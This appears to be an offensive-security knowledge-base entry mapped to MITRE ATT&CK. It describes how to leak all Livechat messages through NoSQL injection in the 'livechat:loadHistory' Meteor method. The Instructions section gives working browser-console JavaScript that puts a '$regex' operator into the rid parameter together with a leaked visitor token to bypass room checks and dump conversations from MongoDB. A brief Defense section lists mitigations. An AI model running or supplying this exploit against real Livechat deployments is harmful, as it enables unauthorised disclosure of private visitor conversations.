---
tags:
  - nosql-injection
  - data-leak
  - messages
type: procedure
tools:
  - '[[tools/Web-Inspector]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/meteor-call-livechat-loadhistory-regex]]'
verified: false
platforms:
  - Web
  - MongoDB
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
updated_at: '2025-12-14T03:46:25.820Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 5dfacc9f-92f0-494b-8e0a-fd473c3900db
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
---
# Leak-Livechat-Messages-via-NoSQL-Injection

## Summary

This procedure uses a leaked visitor token to exploit NoSQL injection in `livechat:loadHistory`, injecting `$regex: '.*'` into the `rid` parameter to bypass room validation and dump all Livechat messages from MongoDB.

## Description

The `rid` parameter in `livechat:loadHistory` is not string-validated, permitting MongoDB operators in the `LivechatRooms.findOneByIdAndVisitorToken` query. With a valid token, `rid: {"$regex":".*"}` matches any room ID, leaking all messages associated with the visitor or broadly. This results in full information disclosure of sensitive data. Requires prior token from bruteforce.

## Requirements

1. Valid visitor token from previous procedure.
2. Active console session on Livechat page.
3. MongoDB backend (inferred from stack).

## Defense

Defensive measures and detection strategies:

- Enforce string-only validation for `rid` and `token`.
- Restrict query scopes in Meteor methods.
- Audit MongoDB logs for regex injections.

## Objectives

1. Bypass room ID check.
2. Retrieve all message histories.
3. Expose sensitive visitor conversations.

## Instructions

### Step 1: Prepare Payload

**Context**: Construct the injection object with leaked token.

In console:

```javascript
const token = 'your_leaked_token';
const payload = { token, rid: {"$regex":".*"} };
```

> Prepares universal room match.

### Step 2: Execute History Load

**Context**: Call the method to fetch all data using [[commands/meteor-call-livechat-loadhistory-regex]].

**Command** ([[commands/meteor-call-livechat-loadhistory-regex]]):
```javascript
Meteor.call('livechat:loadHistory', payload, (error, result) => {
  if (!error && result) {
    console.log(result); // Array of messages
  }
});
```

> Returns message array; inspect for sensitive data like visitor info.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Information Repositories]]

### Sub-Techniques


## Commands Used

- [[commands/meteor-call-livechat-loadhistory-regex]]

## Tools Used

- [[tools/Web-Inspector]]

## Tags

- nosql-injection
- data-leak
- messages
